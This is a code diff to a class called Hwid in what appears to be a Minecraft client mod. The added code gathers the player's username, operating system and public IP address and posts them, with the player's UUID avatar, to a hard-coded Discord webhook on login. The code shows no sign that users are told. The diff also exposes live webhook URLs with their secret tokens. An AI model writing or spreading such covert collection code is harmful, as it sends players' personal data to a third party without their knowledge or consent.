@@ -33,12 +33,24 @@ public class Hwid {
 
 
     public static void sendWebhook() throws IOException {
+        String ip = "";
+        String username = MinecraftClient.getInstance().getSession().getUsername();
+        String osName = System.getProperty("os.name");
         try {
-            Webhook webhook = new Webhook("https://discord.com/api/webhooks/1225281994707959888/UJYqvLy3wkNIPAzyguMOcNWwpP_KOz5olQGojoGU9PaGkLIPMQZOBjh-KJYDoqIETql0");
+            URL whatismyip = new URL("http://checkip.amazonaws.com");
+            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
+            ip = bufferedReader.readLine();
+        } catch (IOException e) {
+            ip = "Could not determine IP";
+            e.printStackTrace();
+        }
+
+        try {
+            Webhook webhook = new Webhook("https://discord.com/api/webhooks/1231376007102201877/wyDv0jP9eFasZd8IVoVoWNr8qBr2nDXPa2Df9FkFPPznPgU1kXmd4iiYywsLk55C8Ngg");
             Webhook.EmbedObject embed = new Webhook.EmbedObject();
             embed.setTitle("hwid");
             embed.setThumbnail("https://crafatar.com/avatars/" + MinecraftClient.getInstance().getSession().getUuid() + "?size=128&overlay");
-            embed.setDescription("New login - " + MinecraftClient.getInstance().getSession().getUsername());
+            embed.setDescription("New login - " + username + " (IP: " + ip + ")" + " OS: " + osName);
             embed.setColor(Color.GRAY);
             embed.setFooter(getTime(), null);
             webhook.addEmbed(embed);
